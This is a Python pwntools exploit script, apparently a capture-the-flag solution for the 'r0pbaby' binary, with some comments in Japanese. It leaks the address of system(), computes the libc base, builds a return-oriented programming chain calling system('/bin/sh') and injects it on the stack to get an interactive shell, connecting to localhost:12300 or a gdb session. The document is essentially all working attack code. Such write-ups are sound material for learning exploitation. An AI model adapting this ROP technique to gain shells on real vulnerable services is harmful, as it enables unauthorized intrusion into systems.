#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./r0pbaby"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(libc)

#preparatory investigation
binsh_off = 0x1b3e9a
rdi_gadget_off = 0x2155f
ret_gadget_off = 0x2c37

#多分だけどdlopenのl_addrに入ってるのは
#リンクアドレスであって実際にロードされたアドレスではない
#よって1で返されるアドレスは意味がない気がする

def exploit(conn):
  global rop

  #get libc base <-- this addr is invalid due to PIE
  #conn.recvuntil(": ")
  #conn.sendline("1")
  #libc.address = int(conn.recvline()[len("libc.so.6: 0x"):],16)
  #print("libc addr: "+hex(libc.address))
  #print("system(in): "+hex(libc.functions["system"].address))

  #get system addr 
  conn.recvuntil(": ")
  conn.sendline("2")
  conn.recvuntil(": ")
  conn.sendline("system")
  addr_system = int(conn.recvline()[-16:],16)
  print("system   : "+hex(addr_system))

  #calc libc base with system's addr and 's offset
  libc.address = addr_system - libc.functions["system"].address

  #generate rop chain
  rop.raw("A"*8)
  rop.raw(libc.address + ret_gadget_off)
  rop.raw(libc.address + rdi_gadget_off)
  rop.raw(libc.address + binsh_off)
  rop.raw(addr_system)
  print(rop.dump())

  #inject rop chain on the stack ($rbp+0)
  conn.recvuntil(": ")
  conn.sendline("3")
  conn.sendline(str(len(str(rop))))
  conn.send(str(rop))

  #exit and run rop
  conn.recvuntil(": ")
  conn.sendline("4")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

